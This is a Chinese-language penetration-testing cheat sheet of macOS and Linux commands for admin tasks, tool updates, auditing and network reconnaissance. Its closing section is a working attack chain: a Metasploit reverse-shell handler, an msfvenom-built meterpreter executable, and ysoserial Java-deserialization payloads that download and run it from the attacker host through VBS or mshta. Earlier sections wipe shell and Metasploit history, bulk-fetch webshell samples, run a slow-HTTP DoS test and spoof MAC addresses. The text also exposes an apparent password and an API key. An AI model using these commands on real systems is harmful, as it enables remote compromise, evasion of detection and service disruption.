# 渗透干货
author: M.T.X. 2018-05-14 
Twitter: @Hktalent3135773

<!--  
-->
## 一键得到无数的webshell，并去重
```
curl -s -q -k https://raw.githubusercontent.com/We5ter/Scanners-Box/master/webshell_samples/README.md -o- |grep "github"|sed 's/- //g'|sed 's/github/codeload\.github/g' |xargs -I % wget %/zip/master
ls master*|xargs -I % bash -c "mv % %.zip"
ls master.*|xargs -I % unzip -B % -d files/
fdupes -d  -N -r files/
rm -rf master*
```

## other awesome-macos-command-line
```
https://github.com/hktalent/tools/awesome-macos-command-line
https://github.com/enaqx/awesome-pentest
https://github.com/herrbischoff/awesome-macos-command-line
```

### 设置当前用户，后面的命令才更好使用
```
export xxx = `whoami`
```

### DEF CON China 1资料下载

```
brew install wget
wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg,ppt,pptx,pdf,doc,docx,zip,rar" https://media.defcon.org/DEF%20CON%20China%201/
```


### 学习资料抓取
```
wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/ruby/ruby-intro.html

wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/python
wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" http://www.runoob.com/python3

wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" https://www.w3cschool.cn/ruby/

wget --remote-encoding=UTF8 -x -c -nH --progress=bar:force:noscroll --tries=0 -N --timeout=3 -r -np --accept="html,htm,ppt,pptx,doc,docx,xls,xlsx,pdf,vsd,mmap,txt,jdbc.properties,png,jpg,svg" https://www.w3cschool.cn/python/
```
## base64编码、解码，在后渗透中编码命令很有用
```
base64 -D -i gfwlist.txt
cat ok.txt|base64
```
## 查看当前ip
```
ipconfig getifaddr en0
ipconfig getifaddr bridge0
ip addr
```

## 参看特定端口进程、使用情况
```
sudo lsof -i :5432
```
## 查看进程信息
```
codesign -vvvv -R="anchor apple" /usr/libexec/rapportd
otool -L /usr/libexec/rapportd
ps -ef |grep -i [r]apport
ps aux | grep rapportd
lsof -i -P | grep -i rapport
```
### 经典的ps命令
```
 ps -aeo ruser,ppid,pid,lstart,%cpu,%mem,etime,tty,args --sort -%cpu,-%mem
```
## 查看缓存中的ip的mac地址
```
arp -a | grep ":" | grep -v "ff:ff:ff" | awk -F ' '  '{print $2 " "  $4}'
```
## 列出当前所有目录、子目录大小
```
du -h * | awk "{print $2}"
```

## 查看当前可用wi-fi
```
airport -s
```
## 当前wi-fi信息
```
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I
```
## 获取当前互联网可见的公网ip
```
curl -s https://api.ipify.org && echo
curl -s http://ip.cn
```

## 文件MD5、sha1、sha512摘要
```
brew install openssl
md5 ysoserial-master.jar 
openssl md5 ysoserial-master.jar 
openssl sha1 ysoserial-master.jar
openssl sha512 ysoserial-master.jar 
```
openssl是个很好的工具哦
## 防火墙命令
```
man pfctl
sudo pfctl -t badhosts -T add 192.168.24.180
sudo pfctl -t badhosts -T show
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/node
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/bin/ruby
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Users/${xxx}/.rvm/rubies/ruby-2.4.3/bin/ruby
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Users/${xxx}/.rvm/rubies/ruby-2.4.1/bin/ruby

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /Users/${xxx}/.rvm/rubies/ruby-2.4.3/bin/ruby
```

## 苹果系统查看端口对应的pid
```
Depending on your version of Mac OS X, use one of these:

lsof -n -i4TCP:$PORT | grep LISTEN
lsof -n -iTCP:$PORT | grep LISTEN
lsof -n -i:$PORT | grep LISTEN
lsof -n -i4TCP:1234
lsof -n -i4TCP:41419
lsof -p 32259

lsof -n -i:59395 
```
## 临时设置允许打开的文件最大数量
```
ulimit -n 65535
```
## 经典端口扫描
```
brew install nmap
brew install masscan
sudo port install arp-scan
```

## 发现sniffer的人
```
brew install nmap
nmap --script=sniffer-detect 192.168.24.0/24
```

## 防止ARP中间人攻击、设置静态mac 地址
```
sudo arp -s 192.168.24.1 84:5b:12:4a:bc:3a
sudo arp -s 192.168.0.1 CC:34:29:97:1C:CC
```

## 排序、合并文件内容，有时候可能会又字符集问题，该命令可搞定，合并结果
```
cat /Volumes/Untitled/rockyou.txt |LC_ALL=C sort|LC_ALL=C uniq > /Volumes/Untitled/rockyou1.txt
```

## 查看查找历史信息
```
export HISTTIMEFORMAT="%F %T `who -u am i 2>/dev/null| awk '{print $NF}'|sed -e 's/[()]//g'`  `whoami` "
```
## 查看已经安装的node js的组件
```
ls -ld /usr/local/lib/node_modules/* | awk '{print $9}'|sed -e 's/\/usr\/local\/lib\/node_modules\///g'
```

## 命令中显示16进制xxd
```
cat *.log|xxd
```

## 清除历史信息、一键优化
```
ls ~/.*his*
cat ~/.bash_history;echo >~/.bash_history
cat ~/.node_repl_history;echo >~/.node_repl_history
echo > /Users/`whoami`/.msf4/history
rm -rf /Users/`whoami`/.msf4/logs/*
rm -rf /Users/`whoami`/.msf4/loot/*
rm -rf /Users/`whoami`/.msf4/local/*
rm -rf /Users/`whoami`/.msf4/logos/*
```
### 笔记自动备份目录
```
cd '/Users/`whoami`/Library/Application Support/Scrivener/Backups/'
ls -lah
mv *.zip /Volumes/mtx_hktalent/bak/
```

### 这些应用占用的空间非常大
```
/Users/${xxx}/Library/Containers/com.tencent.Foxmail
com.tencent.qq
com.tencent.xinWeChat
com.tencent.QQMusicMac

sudo mv /Users/`whoami`/Library/Containers/com.tencent.Foxmail /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/`whoami`/com.tencent.Foxmail /Users/`whoami`/Library/Containers/com.tencent.Foxmail 

sudo mv /Users/`whoami`/Library/Containers/com.tencent.xinWeChat /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/${xxx}/com.tencent.xinWeChat /Users/`whoami`/Library/Containers/com.tencent.xinWeChat

sudo mv /Users/`whoami`/Library/Containers/com.tencent.qq /Volumes/mtx_hktalent/`whoami`/
ln -s /Volumes/mtx_hktalent/`whoami`/com.tencent.qq /Users/`whoami`/Library/Containers/com.tencent.qq
```

# 更新
### port更新
```
sudo proxychains4 -f ~/pc.conf port -v selfupdate
sudo proxychains4 -f ~/pc.conf port upgrade outdated
sudo proxychains4 -f ~/pc.conf port -d sync
```
其中-v表示verbose（冗余），即把信息都显示到Shell上。
### 更新metasploit-framework
```
cd /Users/${xxx}/safe/metasploit-framework;./msfupdate;bundle install;gem update --system;gem update
pip3 list --outdated | sed 's/(.*//g' | xargs sudo pip3 install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
```
### 更新python anaconda是所有包
```
conda update -n base conda
conda upgrade --all


python ~/pip2.py list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs sudo python ~/pip2.py install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs sudo pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple

pip list --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple --outdated | sed 's/(.*//g' | xargs pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
cd ~/
brew
brew update;brew upgrade
nmap
sudo nmap --script-updatedb
/usr/local/Cellar/nmap/7.60/share/nmap/scripts
git clone https://github.com/scipag/vulscan.git
nmap -sV --script=vulscan/vulscan.nse www.example.com
SQLMap

python /Users/${xxx}/safe/top20/sqlmap-dev/sqlmap.py --update
```
### 更新kali中openvas;更新kali linux
```
apt-get autoclean ;  apt-get update ; apt-get upgrade -y ; apt-get dist upgrade -y
openvas-nvt-sync
apt-get update;apt-get upgrade;apt-get dist-upgrade;apt-get autoclean
```

### nessus升级
```
brew install proxychains-ng
sudo proxychains4 -f ~/pc.conf nessuscli update --all
sudo nessuscli update --plugins-only
sudo /Library/Nessus/run/sbin/nessusd start
```
### 批量git更新工程
```
cd /Volumes/BOOK/安全/project;
find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull origin master \;
cd /Users/${xxx}/safe;
find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull origin master \;
```
### 批量更新python
```
pip3 list --outdated | sed 's/(.*//g' | xargs sudo pip3 install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
python ~/pip2.py list --outdated | sed 's/(.*//g' | xargs sudo python ~/pip2.py install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip list --outdated | sed 's/(.*//g' | xargs sudo pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple
pip install -U --trusted-host pypi.douban.com  -i http://pypi.douban.com/simple beautifulsoup4 lxml Markdown pexpect psycopg2  pyOpenSSL PyVirtualDisplay rdflib selenium six SQLAlchemy tornado
```
### 公开漏洞更新
```
searchsploit -u
```
### 更新所有的ruby环境的包
```
rvm use ruby-2.3.1
```
### 清除旧版本
```
gem cleanup
gem update --system
gem update
gem install rubygems-update;update_rubygems
```
### jar安全溯源工具更新库
```
sudo proxychains4 -f ~/pc.conf dependency-check  --updateonly
cd /usr/local/Cellar/dependency-check/3.*/libexec/data/;
/usr/local/Cellar/dependency-check/3.*/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
295436288 Dec 27 10:32 dc.h2.db
which dependency-check 
/usr/local/bin/dependency-check
```
### nodeJs完全更新
```
npm cache clean --force
npm-check -u -g --debug
sh ~/npm-upgrade.sh
npm update -g;npm -g outdated
```
### 修复metasploit的ruby环境

```
sudo chmod go-w /usr/local/bin;sudo chmod 775 /usr/local;sudo chmod 775 /usr/local/bin;sudo chmod 775 /usr/local/ant;sudo chmod 775 /usr/local/ant/bin
cd /Users/${xxx}/safe/metasploit-framework;rvm --default use 2.3.1;./msfupdate
cd /Users/${xxx}/safe/metasploit-framework;./msfupdate
bundle update
env ARCHFLAGS="-arch x86_64" bundle install
env ARCHFLAGS="-arch i386" gem install pg
env ARCHFLAGS="-arch i386 -arch x86_64" gem install pg
```

# java渗透，安全审计点滴
## 查找java进程

```
lsof -i -P | grep java | grep LISTEN
```

## 找出没有使用SafeGene的java进程、jvm
```
ps -ef | grep java | grep -v SafeGene.jar
```
## 查找可能存在远程攻击漏洞的进程
```
ps -ef | grep jmxremote
-Dcom.sun.management.jmxremote.port=9999
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.ssl=false
```

注意：
oracle的虚拟机会判断,如果你带上了这些参数,那么会在内部调用sun.management.Agent.premain
属于Java SE的instrumentation技术.
## 查找root启动的java进程

```
ps -ef -U root | grep java
```

## 查找动态sql
```
find . -type f -name "*.xml" | xargs grep -n -E '\$[^\$]+\$'
find . -type f -name "*.class" | xargs grep -n -E 'selsql'
```
## 查找使用了javaagent技术的进程
```
ps -ef | grep "\-javaagent"
```

## 查看ip区域、ip经纬度
```
nmap -n --top-ports 1  --script ip-geolocation-geoplugin 123.125.114.144
curl http://ipinfo.io/123.125.114.144
curl ipinfo.io/123.125.114.144
{
  "ip": "123.125.114.144",
  "hostname": "No Hostname",
  "city": "Beijing",
  "region": "Beijing",
  "country": "CN",
  "loc": "39.9289,116.3883",
  "org": "AS4808 China Unicom Beijing Province Network"
geoiplookup -d /opt/local/share/GeoIP -v -i -l  123.125.114.144
nmap -n --top-ports 1 --script ip-geolocation-maxmind --script-args ip-geolocation.maxmind_db=/opt/local/share/GeoIP/GeoLiteCity-Blocks.csv 123.125.114.144
```
## 发现抓包模式的机器
```
nmap -sV --script=sniffer-detect 192.168.24.10
Host script results:
|_ sniffer-detect: Likely in promiscuous mode (tests: "11111111")
```
## 用nc进行文件传输
#### 在客户端使用
```
nc -nv target_host target_port < file.txt
```
#### 在服务器端使用
```
nc -l port > file.txt
```
#### 使用默认系统ruby版本
```
rvm use system --default
```
## 磁盘空间情况
```
df -h | grep -v 100%
```

## 挂载linux系统文件
```
sudo sshfs -o allow_other,defer_permissions root@192.168.10.115:/MyWork /usr/local/droplet
sudo umount /usr/local/droplet
Z2I|l6b9QGS5*
sudo umount /usr/local/droplet;sudo sshfs -o allow_other,defer_permissions root@23.105.209.65:/usr/mtx/myapp /usr/local/droplet
```

## jar溯源、审计
```
brew install  dependency-check
dependency-check --enableExperimental --project "洛阳市住房公积金管理信息系统升级改造项目jar溯源" -o all_jar溯源.html --scan /usr/local/droplet/webapps/lyhf/WEB-INF/lib/
cd /root/Downloads/dependency-check/
sh ./bin/dependency-check.sh --enableExperimental --project "All jar risk" -o all_jar.html --scan /MyWork/Project/**/
```
## java源码溯源、java源码审计
```
$ java -jar lib/findbugs.jar -h
Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8
edu.umd.cs.findbugs.gui2.Driver [options] [project or analysis results file]
Options:
  General FindBugs options:
    -project <project>                  analyze given project
    -home <home directory>              specify FindBugs home directory
    -pluginList <jar1[:jar2...]>        specify list of plugin Jar files to load
    -effort[:min|less|default|more|max] set analysis effort level
    -adjustExperimental                 lower priority of experimental Bug Patterns
    -workHard                           ensure analysis effort is at least 'default'
    -conserveSpace                      same as -effort:min (for backward compatibility)
    -f <font size>                      set font size
    -clear                              clear saved GUI settings and exit
    -priority <thread priority>         set analysis thread priority
    -loadBugs <saved analysis results>  load bugs from saved analysis results
    -d                                  disable docking
    --nodock                            disable docking
    -look[:plastic|gtk|native]          set UI look and feel

java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -low -html -output myRst.html .


java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -pluginList /Users/${xxx}/safe/top20/findbugs-3.0.1/plugin/findsecbugs-plugin-1.6.0.jar -low -html -output cdsb.html /Volumes/mtx_hktalent/2017/成都三版\ 项目war包/cdsb/WEB-INF/classes 
java -jar /Users/${xxx}/safe/top20/findbugs-3.0.1/lib/findbugs.jar -sortByClass -low -html -output Ta3.html  /Volumes/mtx_hktalent/2017/成都三版\ 项目war包/sxdy/WEB-INF/lib/ta3*.jar
```

## 查看历史连接过的wi-fi
```
networksetup -listpreferredwirelessnetworks en0
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences| sed 's|\./|`pwd`/|g' | sed 's|.plist||g'|grep 'LastConnected' -A 7
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep SSIDString
defaults read /Library/Preferences/SystemConfiguration/com.apple.airport.preferences |grep SSIDString
```

## 安全审计命令
```
vi /usr/local/Cellar/lynis/2.4.0/default.prf 
lynis audit system
```
## go语言环境更新
```
/usr/local/opt/go/bin/gopm
```
## 一些链接，优化存储空间
```
ln -s /Volumes/data/iBooks /Users/${xxx}/Library/Containers/com.apple.BKAgentService/Data/Documents/iBooks
ln -s /Volumes/data/iBooks /Users/${xxx}/iBooks
ln -s /Volumes/data/Foxmail /Users/${xxx}/Library/Containers/com.tencent.Foxmail/Data/Library/Foxmail
```
## 命令启动mysql
```
 /usr/local/mysql/bin/mysqld --user=_mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --log-error=/usr/local/mysql/data/mysqld.local.err --pid-file=/usr/local/mysql/data/mysqld.local.pid
```

## 修复mysql
```
cd /usr/local/mysql;sudo chown -R mysql:_mysql  data
```
### mysql无法启动修正
```
cd /usr/local/mysql
sudo chown -R _mysql:staff *
```
## 查看各磁盘使用情况
```
df -h
```
## 查找大于1G的文件
```
find . -type f -size +1000000k -exec ls -lh {} \;
```
## 查找所有连接
```
sudo find / -type l -exec ls -la {} \;
sudo find / -type l -exec ls -la {} \; | grep “/Volumes/”
```

## web应用慢速DDOS攻击测试
```
slowhttptest -v 3 -H -B -R -X -o QIMS.html -c 200 -u http://192.168.24.14:8079/QIMS/login.jsp?test=true -k 10 -g
```
## 并发测试
```
以苹果系统为例
brew install wrk
wrk -t12 -c400 -d30s http://erp.xxx.com:8082
```
## linux查看进程
```
 ps -ef | grep -v -E "\[" | awk '{print $8;}'|sort|uniq|grep "/"
 ps -aeo args --sort -%cpu,-%mem | sort|uniq 
```
## linux查找可疑连接
```
netstat -anlp | grep -v "unix " | grep -v "0.0.0.0:\*" | grep -v ":::\*" | grep -v "/mysqld" | grep -v "/oracle" | grep -v "/ssh"|grep -v "State I-Node" |grep -v "127.0.0.1" |grep -v "Address Foreign Address" | awk '{print $5,$6,$7,$8,$9,$10,$11;}' | grep -v "192.168." | sed 's/::ffff://'| sed 's/ESTABLISHED//'| sed 's/SYN_SENT//'|grep -v "I-Node"| grep -v "Foreign Address" | grep -v "::1:"
https://github.com/NetSPI/PowerUpSQL
http://www.freebuf.com/sectool/131550.html
netstat -anp | grep -v "unix " | grep -v "0.0.0.0:\*" | grep -v ":::\*" | grep -v "/mysqld" | grep -v "/oracle" | grep -v "/ssh"|grep -v "State I-Node" | grep -v "servers and established"  |grep -v "127.0.0.1" | grep -v  established |grep -v "Address Foreign Address" | awk '{print $5,$6,$7,$8,$9,$10,$11;}' | grep -v "192.168." | sed 's/::ffff://'| sed 's/ESTABLISHED//'| sed 's/SYN_SENT//'|grep -v "I-Node"| grep -v "Foreign Address" | grep -v "::1:" | sed 's/FIN_WAIT2 - //' | sed 's/CLOSE_WAIT//'| sed 's/LAST_ACK -//'| sed 's/TIME_WAIT -//'|sort|uniq 
```
## 苹果系统查看可疑连接
```
netstat -A | grep -E "tcp4|udp4" | grep -E '\d+.\d+.\d+.\d+'
```
## 获取所有磁盘信息
```
diskutil info -all
```
## 映射ntfs磁盘可读写
```
mkdir /Users/${xxx}/C
sudo umount /Users/${xxx}/C
sudo mount -t ntfs -o nobrowse,rw /dev/disk5s1 /Users/${xxx}/C
```
## nessus启动
```
sudo /Library/Nessus/run/sbin/nessusd start
```
## nessus连接
```
/Library/Nessus/run/var/nessus/plugins-code.db
https://localhost:8834/#/
```

## 去除重复数据
```
cat xiaozu.txt |sort|uniq
```
## 查看各磁盘情况
```
diskutil list
```
## 查看端口的连接
```
netstat -na | grep 8080
netstat -na | grep tcp4 | grep -v "*.*" | grep -v "127.0.0.1" | awk '{print $5;}'
```
## 扫描mac地址信息
```
sudo arp-scan 192.168.1.0/16 |grep '\d*\.\d*\.\d*\.\d*' | grep -v DUP
sudo arp-scan --localnet|grep '\d*\.\d*\.\d*\.\d*' | grep -v DUP
sudo arp-scan --localnet| grep -v DUP | grep -e '\d*\.\d*\.'
sudo arp-scan 192.168.0.1/16
sudo arp-scan --interface=en0 --localnet| grep -v DUP | grep -e '\d*\.\d*\.'
sudo arp-scan 192.168.0.1/16| grep -v DUP | grep -e '\d*\.\d*\.'
```
## 启动mysql
```
sudo chown -R _mysql:_mysql /usr/local/mysql/data
/usr/local/mysql/support-files/mysql.server start
```

## 修改mac地址不需要停网卡
```
networksetup -listallhardwareports
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: b8:e8:56:02:4e:8c

Hardware Port: Bluetooth PAN
Device: en2
Ethernet Address: b8:e8:56:02:4e:8d

Hardware Port: Thunderbolt 1
Device: en1
Ethernet Address: 32:00:17:ff:a0:00

Hardware Port: Thunderbolt Bridge
Device: bridge0
Ethernet Address: 32:00:17:ff:a0:00
手机mac地址54:9F:13:1A:CD:78
sudo ifconfig bridge0 ether 54:9F:13:1A:CD:78
echo ${rtpswd} | sudo -S  ifconfig bridge0 ether b8:12:34:56:78:88
echo ${rtpswd} | sudo -S ifconfig en0 ether  28:d2:48:6d:1b:88

sudo ifconfig en0 ether 54:9F:13:1A:CD:78
sudo ifconfig en0 ether  88:BB:8B:6b:88:86

sudo ifconfig bridge0 ether 8A:73:58:25:66:D5
sudo ifconfig bridge0 ether AB:CD:78:12:34:56

sudo ifconfig bridge0 inet6  8888::bbbb:6666:555:8888%bridge0 prefixlen 64 secured scopeid 0x6
sudo ifconfig bridge0 inet6  '8888::bbbb:6666:555:8888%bridge0 prefixlen 64 secured scopeid 0x6'
```

## 关闭ipv6
```
networksetup -setv6off wi-fi
networksetup -setv6off bridge0
```
## 查看IP
```
ifconfig en0
```
## 批量杀进程
```
 ps -ef | grep postgres |grep -v grep|cut -c 6-11|xargs kill -9
 ps -ef | grep port |grep -v grep|cut -c 6-11|xargs kill -9
```
## 修复磁盘
```
fsck_hfs -fy -x /dev/rdisk2s2
```

## 关闭ipv6
```
networksetup -listnetworkserviceorder
networksetup -setv6off 'Wi-Fi'
networksetup -setv6off 'iPhone USB'
networksetup -setv6off 'Bluetooth PAN'
networksetup -setv6off 'Thunderbolt'
```
## 查找大于1G的文件
```
find . -type f -size +100000k -exec ls -lh {} \;
```
## 16进制显示
```
xxd  ~/C/targets.txt 
```

## 批量去除背景
```
Adobe Acrobat Pro DC
可以批量处理背景图片哈


https://www.imagemagick.org/download/binaries/ImageMagick-7.0.7-28-Q16-x64-static.exe
https://www.imagemagick.org/download/binaries/ImageMagick-7.0.7-28-Q16-x86-static.exe

brew install ImageMagick
brew install ImageMagick --with-pango --with-perl --with-opencl --with-openjpeg --with-ghostscript --with-fontconfig 

很多实用脚背
http://www.fmwconcepts.com/imagemagick/textcleaner/index.php

一些去除背景的例子
http://www.imagemagick.org/discourse-server/viewtopic.php?t=32305


1、苹果系统：mac os系统

2、安装：brew
xcode-select --install
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install ImageMagick


3、很不错的去除背景的命令、参数
1）、convert ok.jpg \( +clone -blur 0x20 \) -compose Divide_Src -composite  kkk.jpg
2）、convert ok.jpg -fuzz 20% -transparent white result.png

分享：如何将pdf转换为长图？两个linux命令
gs -sDEVICE=pngalpha -o file-%03d.png -r144   信息安全部公约.pdf

convert file-001.png file-002.png file-003.png file-004.png file-005.png file-006.png file-007.png file-008.png  -append group_1.png
convert `ls  file-0*.png`  -append oneAll.png
convert image.png -gravity Center -region 10x10-40+20 -negate output.png
-compress jpeg -quality 50
convert 895452632.png -compress jpeg -quality 50 xxx.jpg

convert xxx.jpg -resize 200x200 wx.jpg
convert -delay 20 -loop 0 xxx.jpg xiatian2.jpg myimage.gif
convert -resize 768x576 -delay 20 -loop 0 `ls -v` myimage.gif

magicwand 1,1 -t 20 -f image -r outside -m overlay -o 0 image.jpg imgOutput.png
magick 1335624623-956109868.jpg -fuzz 20% -fill none -draw "alpha 1x1 floodfill" result.png


4、查找、批量处理:去除背景（处理前记得先备份）
find ./ -type f \( -iname \*.jpg -o -iname \*.png -o -iname \*.ttf -o -iname \*.tif \) -exec convert {} \( +clone -blur 0x20 \) -compose Divide_Src -composite {} \;

3、查找图片
find ./ -type f \( -iname \*.jpg -o -iname \*.png -o -iname \*.ttf -o -iname \*.tif -o -iname \*.jpeg \) 
Explanation:
	•	type -f - only search for files (not directories)
	•	\( - needed for the type -f to apply to all arguments
	•	-o - logical OR operator
	•	-iname - like -name, but the match is case insensitive

```
## 新硬盘格式化bug解决
```
问题解决：
MediaKit reports not enough space on device for requested operation.
https://mycyberuniverse.com/web/how-fix-mediakit-reports-not-enough-space-on-device.html

1、diskutil list

/dev/disk4 (external, physical):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      GUID_partition_scheme                        *4.0 TB     disk4
   1:         Microsoft Reserved                         134.2 MB   disk4s1
   2:       Microsoft Basic Data                         4.0 TB     disk4s2

2、diskutil unmountDisk force disk4

3、sudo dd if=/dev/zero of=/dev/disk4 bs=1024 count=1024
格式化盘
4、diskutil partitionDisk disk4 GPT JHFS+ "Elements" 0g

5、用系统的disk utility工具分区
```
## 开启wi-fi，查看自己当前ip、及经纬度
```
1、方法一
https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&key=AIzaSyDBgL8fm9bD8RLShATOLI1xKmFcZ4ieMkM&sensor=true
https://github.com/lypiut/WhereAmI
$ git clone https://github.com/victor/whereami.git whereami
$ cd whereami
$ git checkout swift
$ git submodule update --init --recursive
$ xctool install
https://github.com/BenConstable/where-am-i
npm install -g --save where-am-i
var WhereAmI = require('where-am-i')
  , help = new WhereAmI()
help.findMe(
    function (place) {
        // Located successfully!
        console.log(place.lat)
        console.log(place.lng)
        console.log(place.country.name)
    }
  , function (err) {
        // Could not locate!
    }
)
2、方法二
curl http://ipinfo.io/
```


# 一次简单的渗透
## 端口扫描

```
sudo masscan -p1099 --rate=100000 192.168.0.1/16
cat ips.txt |awk  '{print $6}'|xargs nmap -sV --script=exploit,external,vuln,auth,default -p 1099
sudo masscan -p1098 --rate=100000 192.168.0.1/16
cat ips.txt |awk  '{print $6}'|xargs nmap -sV --script=exploit,external,vuln,auth,default -p 1098

nmap -p445 192.168.10.1/24 --script=/usr/local/share/nmap/scripts/ipidseq.nse
sudo nmap -sV -p 1099 192.168.0.1/16 -Pn

```
## 1、运行监听
等待中招的机器连接回来

```
./msfconsole
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST 0.0.0.0
set LPORT       4445
run -j -z
```

## 2、生成攻击代码

```
cd /Users/`whoami`/safe/top20/metasploit-framework/
./msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe

./msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.24.10 LPORT=4445 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe


use windows/misc/hta_server
run -j -z

那么远程执行代码
mshta http://192.168.24.10:8080/WxtpFMT1WId.hta
参考：
https://github.com/redcanaryco/atomic-red-team
https://github.com/Arno0x/PowerShellScripts
DNS隧道
https://github.com/Arno0x/DNSExfiltrator

```

## 3、监听http服务
等待中招，存在漏洞的机器连接、下载、运行

```
cd /Users/`whoami`/safe/top20/metasploit-framework/tmp
cd tmp
python -m SimpleHTTPServer 9999
```

## 4、发动攻击

```
mkdir /Users/`whoami`/safe/
cd /Users/`whoami`/safe/
git clone https://github.com/hktalent/myhktools.git myhktools
cd myhktools

java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

生成各种java反序列化漏洞的攻击代码
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections1.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections2.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections3.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections4.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections5.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections6.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' >C3P0.bin
java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > BeanShell1.bin
